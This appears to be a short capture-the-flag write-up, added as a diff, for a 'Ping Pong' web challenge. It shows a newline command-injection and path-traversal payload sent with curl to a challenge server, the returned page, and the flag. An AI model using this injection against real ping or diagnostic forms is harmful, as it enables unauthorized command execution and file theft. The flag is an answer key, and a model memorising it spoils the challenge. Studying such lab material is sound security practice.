@@ -1,0 +1,44 @@
+OS Command + Path Traversal
+Payload: 8.8.8.8%0acat+../flag.txt
+Có thể làm bằng curl hoặc burpsuite
+
+┌──(kali㉿B21DCAT077-Giang-Kali)-[~/…/CTF_Basic/CHH_WEB/Baby SQLite With Filter/sql-injection-004]
+└─$ curl -d "ip=8.8.8.8%0acat+../flag.txt" http://103.97.125.56:31116/         
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Ping Pong</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link href="style.css" rel="stylesheet">
+</head>
+<body class="text-center">
+<main class="form-ping">
+    <form method="post">
+        <img class="mb-4" src="picture.gif" alt="" width="272" height="257">
+        <h1 class="h3 mb-3 fw-normal">Ping machine</h1>
+
+        <div class="form-floating">
+            <input name="ip" class="form-control" id="floatingInput">
+            <label for="floatingInput">Ip address</label>
+        </div>
+        <div class="text-start">
+            8.8.8.8
+cat ../flag.txt<pre>PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=55 time=35.240 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=55 time=35.284 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=55 time=35.180 ms
+64 bytes from 8.8.8.8: icmp_seq=3 ttl=55 time=35.097 ms
+--- 8.8.8.8 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 35.097/35.200/35.284/0.070 ms
+CHH{EASY_f11tEr_coMM4ND_INJ3c71oN_ba18f16fa82d57992e802147444d75a1}</pre>        </div>
+
+        <button class="w-100 btn btn-lg btn-primary" type="submit">Ping</button>
+    </form>
+</main>
+</body>
+</html>
+
+Flag: CHH{EASY_f11tEr_coMM4ND_INJ3c71oN_ba18f16fa82d57992e802147444d75a1}
